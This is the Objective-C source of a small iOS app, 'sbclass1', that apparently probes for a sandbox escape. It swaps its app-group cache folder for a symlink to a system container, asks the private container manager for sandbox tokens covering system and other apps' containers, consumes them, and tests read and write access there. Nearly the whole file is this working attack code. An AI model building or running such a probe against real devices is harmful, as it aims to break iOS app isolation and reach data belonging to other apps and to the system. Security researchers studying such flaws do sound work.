// sbclass1 — one MCM class per launch, in-process (no fork).
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_ids, q_group_ids;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static FILE *gLog;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbclass1] %@", s);
    if (gLog) { fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); }
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen fail"); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_ids = (fn_set_obj)dlsym(h, "container_query_set_identifiers");
    q_group_ids = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    return q_create && q_get && q_token && s_consume;
}

static void queryOne(uint64_t cls, const char *ident, int group, uint64_t part, uint64_t flags) {
    void *q = q_create();
    q_class(q, cls);
    void *x = xpc_string ? xpc_string(ident) : NULL;
    if (group) { if (q_group_ids) q_group_ids(q, x); }
    else { if (q_ids) q_ids(q, x); }
    q_part(q, part);
    q_flags(q, flags);
    void *res = q_get(q);
    char *tok = (res && q_token) ? q_token(res) : NULL;
    const char *tp = "";
    if (tok) { const char *p = strrchr(tok, ';'); tp = p ? p+1 : ""; }
    L(@"cls=%llu group=%d part=%llu flags=0x%llx id=%s res=%p tok=%s path=%s",
      (unsigned long long)cls, group, (unsigned long long)part, (unsigned long long)flags,
      ident, res, tok ? "YES" : "NO", tp);
    if (tok) {
        int64_t h = s_consume(tok);
        L(@"cls=%llu consume=%lld", (unsigned long long)cls, (long long)h);
        if (h >= 0) {
            NSString *p = [NSString stringWithUTF8String:tp];
            if (p.length) {
                errno=0; DIR *d=opendir(p.fileSystemRepresentation);
                L(@"cls=%llu opendir %@ -> %p errno=%d", (unsigned long long)cls, p, d, errno);
                if (d) closedir(d);
                NSString *m=[p stringByAppendingPathComponent:@"sbclass1_marker"];
                errno=0; int fd=open(m.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);
                L(@"cls=%llu write %@ -> %d errno=%d", (unsigned long long)cls, m, fd, errno);
                if (fd>=0){write(fd,"x",1);close(fd);unlink(m.fileSystemRepresentation);}
            }
            s_release(h);
        }
        free(tok);
    }
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
}

static void runProbe(void) {
    @autoreleasepool {
        const char *cs = getenv("SBCLASS");
        const char *ts = getenv("SBTARGET");
        uint64_t cls = cs ? strtoull(cs, NULL, 0) : 7;
        NSString *target = ts ? [NSString stringWithUTF8String:ts]
            : @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        gLog = fopen([NSHomeDirectory() stringByAppendingPathComponent:@"Documents/sbclass1.log"].fileSystemRepresentation, "w");
        L(@"=== sbclass1 start pid=%d cls=%llu target=%@", getpid(), (unsigned long long)cls, target);
        if (!load()) { exit(1); }
        NSString *gid = nil;
        NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2"];
        for (NSString *g in ids) {
            NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:g];
            if (u.path.length) { gid = g; break; }
        }
        if (!gid) { L(@"no group"); exit(1); }
        NSString *root = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid].path;
        NSString *part = [root stringByAppendingPathComponent:@"Library/Caches"];
        NSString *bak = [part stringByAppendingString:@".class1bak"];
        NSFileManager *fm = [NSFileManager defaultManager];
        [fm createDirectoryAtPath:[part stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
        struct stat st;
        if (lstat(part.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode)) {
            unlink(part.fileSystemRepresentation);
        }
        if (lstat(bak.fileSystemRepresentation, &st) == 0) {
            struct stat sp;
            if (lstat(part.fileSystemRepresentation, &sp) != 0) {
                rename(bak.fileSystemRepresentation, part.fileSystemRepresentation);
            } else {
                [fm removeItemAtPath:bak error:nil];
            }
        }
        if (lstat(part.fileSystemRepresentation, &st) == 0 && S_ISDIR(st.st_mode)) {
            [fm moveItemAtPath:part toPath:bak error:nil];
        }
        unlink(part.fileSystemRepresentation);
        symlink(target.fileSystemRepresentation, part.fileSystemRepresentation);
        NSArray *idents = @[@"app.lake9674.aquila8809", gid, @"com.apple.geod",
            @"systemgroup.com.apple.mobilegestaltcache", @"com.apple.Preferences", @"com.apple.mobilesafari"];
        for (NSString *idn in idents) {
            queryOne(cls, idn.UTF8String, 0, 3, 0x8000000000ULL);
            queryOne(cls, idn.UTF8String, 1, 3, 0x8000000000ULL);
        }
        if (cls == 13) {
            queryOne(cls, "systemgroup.com.apple.mobilegestaltcache", 1, 3, 0x8100000000ULL);
        }
        unlink(part.fileSystemRepresentation);
        if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:part error:nil];
        L(@"=== sbclass1 done cls=%llu ===", (unsigned long long)cls);
        if (gLog) { fclose(gLog); gLog=NULL; }
        exit(0);
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc=[UIViewController new]; vc.view.backgroundColor=[UIColor systemBackgroundColor];
    UILabel *l=[[UILabel alloc] initWithFrame:vc.view.bounds]; l.text=@"sbclass1"; l.textAlignment=NSTextAlignmentCenter;
    [vc.view addSubview:l]; self.window.rootViewController=vc; [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
